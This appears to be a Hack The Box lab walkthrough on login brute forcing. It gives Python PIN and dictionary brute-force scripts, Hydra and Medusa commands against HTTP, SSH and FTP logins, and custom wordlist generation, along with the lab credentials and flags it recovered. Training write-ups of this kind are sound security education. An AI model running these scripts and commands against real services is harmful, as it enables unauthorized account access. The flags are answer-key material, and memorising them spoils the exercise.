# HTB-Login_Brute_Forcing

## Table of Contents
1. [Brute Force Attacks](#brute-force-attacks)
    1. [Brute Force Attacks](#brute-force-attacks-1)
    2. [Dictionary Attacks](#dictionary-attacks)
2. [Hydra](#hydra)
    1. [Basic HTTP Authentication](#basic-http-authentication)
    2. [Login Forms](#login-forms)
3. [Medusa](#medusa)
    1. [Web Services](#web-services)
4. [Custom Wordlists](#custom-wordlists)
    1. [Custom Wordlists](#custom-wordlists-1)
5. [Skills Assessment](#skills-assessment)
    1. [Skills Assessment Part 1](#skills-assessment-part-1)
    2. [Skills Assessment Part 2](#skills-assessment-part-2)


## Brute Force Attacks
### Brute Force Attacks
#### Challenges
1. After successfully brute-forcing the PIN, what is the full flag the script returns?

    To solve this, we can modify script in the module to use thread for faster result.

    ```python
    import requests
    from concurrent.futures import ThreadPoolExecutor
    import time

    ip = "94.237.51.160"
    port = 33535
    MAX_WORKERS = 50  # Number of simultaneous requests (adjust based on network/server)

    def check_pin(pin):
        """Function to perform a single request and check for the flag."""
        formatted_pin = f"{pin:04d}"
        
        # Use a try-except block to handle connection errors gracefully
        try:
            response = requests.get(f"http://{ip}:{port}/pin?pin={formatted_pin}", timeout=5) # Add a timeout
            
            # Check if the server responds with success and the flag is found
            if response.ok:
                try:
                    # Assuming the flag is in the JSON response
                    data = response.json()
                    if 'flag' in data:
                        return formatted_pin, data['flag']
                except requests.exceptions.JSONDecodeError:
                    # Handle cases where the response isn't JSON but is OK (e.g., a "wrong pin" message)
                    pass

        except requests.exceptions.RequestException as e:
            # print(f"Error checking PIN {formatted_pin}: {e}") # Uncomment for debugging
            pass # Ignore errors and continue to the next PIN

        return None

    start_time = time.time()
    found_flag = False

    # Use ThreadPoolExecutor to run checks concurrently
    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        # Map the check_pin function across the range of 0 to 9999
        # The executor runs these checks concurrently
        results = executor.map(check_pin, range(10000))
        
        for result in results:
            if result is not None:
                # We found the flag!
                pin, flag = result
                print(f"\nCorrect PIN found: {pin}")
                print(f"Flag: {flag}")
                # Since map() waits for all futures, we can't easily cancel. 
                # We just print the result and let the loop finish, or raise an exception to stop.
                found_flag = True
                break # Print, but the concurrent execution will continue until all workers finish
                
    end_time = time.time()
    print(f"\nTotal time elapsed: {end_time - start_time:.2f} seconds")
    ```
    ![alt text](<Assets/Brute Force Attacks.png>)

    The answer is `HTB{Brut3_F0rc3_1s_P0w3rfu1}`.

### Dictionary Attacks
#### Challenges
1. After successfully brute-forcing the target using the script, what is the full flag the script returns?

    We can use this script to solve this challenge.

    ```python
    import requests

    ip = "94.237.61.202"  # Change this to your instance IP address
    port = 41529       # Change this to your instance port number

    # Download a list of common passwords from the web and split it into lines
    passwords = requests.get("https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/500-worst-passwords.txt").text.splitlines()

    # Try each password from the list
    for password in passwords:
        print(f"Attempted password: {password}")

        # Send a POST request to the server with the password
        response = requests.post(f"http://{ip}:{port}/dictionary", data={'password': password})

        # Check if the server responds with success and contains the 'flag'
        if response.ok and 'flag' in response.json():
            print(f"Correct password found: {password}")
            print(f"Flag: {response.json()['flag']}")
            break
    ```
    ![alt text](<Assets/Dictionary Attacks - 1.png>)

    The answer is `HTB{Brut3_F0rc3_M4st3r}`.

## Hydra
### Basic HTTP Authentication
#### Challenges
1. After successfully brute-forcing, and then logging into the target, what is the full flag you find?

    We can use hydra to solve this.

    ```bash
    hydra -l basic-auth-user -P 2023-200_most_used_passwords.txt 94.237.63.174 http-get / -s 37753
    ```
    Then we will get this credential, `basic-auth-user:Password@123`. We can use that to login from firefox. The answer is `HTB{th1s_1s_4_f4k3_fl4g}`.

### Login Forms
#### Challenges
1. After successfully brute-forcing, and then logging into the target, what is the full flag you find?

    Firs, we need to make sure what is invalid login response. In this case, `Invalid credentials` is the response. So we can use hydra with that condition.

    ```bash
    hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt -f 94.237.63.174 -s 40173 http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"
    ```
    We will found this credential, `admin:zxcvbnm`. The answer is `HTB{W3b_L0gin_Brut3F0rc3}`.

## Medusa
### Web Services
#### Challenges
1. What was the password for the ftpuser?

    The module has been give the credential for ssh, `sshuser:1q2w3e4r5t`. Once we in the ssh, we can use medusa to brute force the password of user `ftpuser`.

    ```bash
    medusa -h 94.237.120.112 -n 53143 -u ftpuser -P 2020-200_most_used_passwords.txt -M ftp -t 5
    ```
    The password is `qqww1122`.

2. After successfully brute-forcing the ssh session, and then logging into the ftp server on the target, what is the full flag found within flag.txt?

    We can use the credential that we have found to login ftp.

    ```bash
    ftp ftp://ftpuser:qqww1122@localhost
    ```
    The answer is `HTB{SSH_and_FTP_Bruteforce_Success}`.

## Custom Wordlists
### Custom Wordlists
#### Tools
1. Username Anarchy
2. cupp
#### Challenges
1. After successfully brute-forcing, and then logging into the target, what is the full flag you find?

    We already have several information, like name, username, birth date, etc. First, we can generate username list by using `username-anarchy`.

    ```bash
    username-anarchy Jane Smith > jane_smith_usernames.txt
    ```
    Then, we can generate possible password by using `cupp`. Here the input data:

    ![alt text](<Assets/Custom Wordlists - 1.png>)

    The company has passwowrd policy. We can filter the password list to get the passwords that meet the requirements.
    ```bash
    grep -E '^.{6,}$' jane.txt | grep -E '[A-Z]' | grep -E '[a-z]' | grep -E '[0-9]' | grep -E '([!@#$%^&*].*){2,}' > jane-filtered.txt
    ```
    After that, we can use hydra to bruteforce.

    ```bash
    hydra -L jane_smith_usernames.txt -P jane-filtered.txt 83.136.253.5 -s 42961 -f http-post-form "/:username=^USER^&password=^PASS^:Invalid credentials"
    ```
    We will find the correct credential, `jane:3n4J!!`. The answer is `HTB{W3b_L0gin_Brut3F0rc3_Cu5t0m}`.

## Skills Assessment
### Skills Assessment Part 1
1. What is the password for the basic auth login?

    We can use `hydra` to bruteforce basic auth login.

    ```bash
    hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt 83.136.249.164 http-get / -s 55963 -t 4
    ```
    We will get this credential, `admin:Admin123`. The answer is `Admin123`.

2. After successfully brute forcing the login, what is the username you have been given for the next part of the skills assessment?

    We can use the credential that we have found in the previous to login. We will get the username on there. The answer is `satwossh`.

### Skills Assessment Part 2
1. What is the username of the ftp user you find via brute-forcing?

    In the previous, we have found `satwossh` username. If we check via `nmap` what service is on the port given by the challenge, we will know that it is ssh service. So we can use hydra to find the password.

    ```bash
    hydra -l satwossh -P 2023-200_most_used_passwords.txt ssh://94.237.55.124 -s 32394
    ```
    The password is `password1`. We can login via ssh with the credential. Once we have login, we can see several files in there.

    ![alt text](<Assets/Skills Assessment Part 2 - 1.png>)

    Based on that, we have information that `Thomas Smith` has access to the ftp service. We can use `username-anarchy` tp generate possible username.

    ```bash
    username-anarchy Thomas Smith > usernames.txt
    ```
    Then, we can use `hydra` to bruteforce ftp login.
    
    ```bash
    hydra -L usernames.txt -P passwords.txt ftp://localhost
    ```
    We will find this credential, `thomas:chocolate!`. The answer is `thomas`.

2. What is the flag contained within flag.txt

    We can use the credential to login ftp.

    ```bash
    ftp ftp://thomas:'chocolate!'@localhost
    ```
    Once we have login, we can find the flag in there. The answer is `HTB{brut3f0rc1ng_succ3ssful}`.